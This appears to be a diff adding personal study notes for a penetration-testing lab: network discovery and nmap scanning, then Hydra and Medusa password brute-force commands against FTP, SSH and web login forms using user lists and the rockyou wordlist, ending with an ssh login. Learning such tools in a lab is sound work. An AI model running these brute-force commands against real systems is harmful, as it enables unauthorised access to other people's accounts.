@@ -1,0 +1,13 @@
+netdiscover -r <source IP>
+nmap -sV 192.168.36.144 (scan the target matchine)
+hydra -h (for Hydra help)
+hydra ftp://192.168.235.134 -L user.txt -P pass.txt -V -f (L-unknown username, P-unknown password, V-Show the process, f-after sussessfully done it will be stop)
+hydra ftp://192.168.235.134 -L user.txt -P pass.txt -V -f -t 2 (send packet 2/2 , by deafult it is 16)
+Medusa -h 192.168.235.134 -U user.txt -P pass.txt -M -f (U-unknown username, P-unknown password, M-Show the process, f-after sussessfully done it will be stop)
+rockyou.txt
+hydra -l admin -P rockyou.txt ssh://192.168.1.10
+hydra -L users.txt -P pass.txt ftp://127.0.0.1
+hydra -l user -P pass.txt 192.168.1.20 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+hydra 192.168.235.134 -l rana -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -V -f (for an website)
+
+ssh -p 22 <username>@<IP Number> (for access the system)
